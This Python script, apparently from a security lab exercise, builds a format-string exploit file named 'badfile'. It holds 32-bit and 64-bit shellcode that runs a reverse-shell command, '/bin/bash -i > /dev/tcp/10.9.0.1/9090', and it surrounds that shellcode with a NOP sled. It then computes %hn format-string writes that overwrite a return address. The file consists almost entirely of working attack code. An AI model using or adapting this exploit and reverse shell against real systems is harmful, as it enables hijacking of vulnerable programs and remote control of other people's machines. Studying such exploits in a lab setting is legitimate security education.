#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1;echo 'HI' *"
   "/bin/bash"   # Placeholder for argv[0] --> "/bin/bash"
   "-c"   # Placeholder for argv[1] --> "-c"
   "ls"   # Placeholder for argv[2] --> the command string
   "\x00"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1;echo 'HI' *"
   "/bin/bash"   # Placeholder for argv[0] --> "/bin/bash"
   "-c"   # Placeholder for argv[1] --> "-c"
   "ls"   # Placeholder for argv[2] --> the command string
   "\x00"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
content[N-len(shellcode):N] = shellcode
print("Start of shell: ", N- len(shellcode))

############################################################
#
#    Construct the format string here
# 
############################################################

start_offset = 88
start_addr = 0x00007fffffffe040 #This is the frame pointer

addr1 = start_addr + 8
content[start_offset:start_offset+8] = (addr1).to_bytes(8, byteorder='little') #Return address

addr2 = start_addr + 10
content[start_offset+8:start_offset+16] = (addr2).to_bytes(8, byteorder='little') #Return address + 2

addr3 =  start_addr + 12
content[start_offset+16:start_offset+24] = (addr3).to_bytes(8, byteorder='little') #Return address + 4

addr4 = start_addr + 14
content[start_offset+24:start_offset+32] = (addr4).to_bytes(8, byteorder='little') #Return address + 6

#New Return addr = 0x00007fffffffe100 + 160*8 = 0x00007fffffffe608
part0 = 0x0000
part1 = 0x7FFF 
part2 = 0xE608 - 0x7FFF 
part3 = 0xFFFF - 0xE608

#Write them to the correct part of the addresses above
s = "%48$hn" \
  + "%." + str(part1) + "lx" + "%47$hn" \
  + "%." + str(part2) + "lx" + "%45$hn" \
  + "%." + str(part3) + "lx" + "%46$hn"

fmt = (s).encode('latin-1')

content[0:len(fmt)] = fmt

print("LEN FMT: ", len(fmt))

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
